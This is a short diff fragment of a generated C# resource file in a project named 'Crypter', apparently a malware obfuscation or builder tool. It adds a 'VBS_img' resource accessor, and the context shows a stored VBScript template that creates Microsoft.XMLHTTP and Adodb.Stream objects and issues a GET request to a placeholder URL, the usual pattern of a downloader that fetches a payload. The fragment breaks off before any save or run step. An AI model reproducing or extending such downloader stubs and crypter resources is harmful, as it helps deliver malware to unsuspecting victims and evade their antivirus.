@@ -428,6 +428,15 @@ namespace Crypter.Properties {
         }
         
         /// <summary>
+        ///   查找类似  的本地化字符串。
+        /// </summary>
+        internal static string VBS_img {
+            get {
+                return ResourceManager.GetString("VBS_img", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   查找类似 dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
         ///dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
         ///xHttp.Open &quot;GET&quot;, &quot;123456&quot;, False
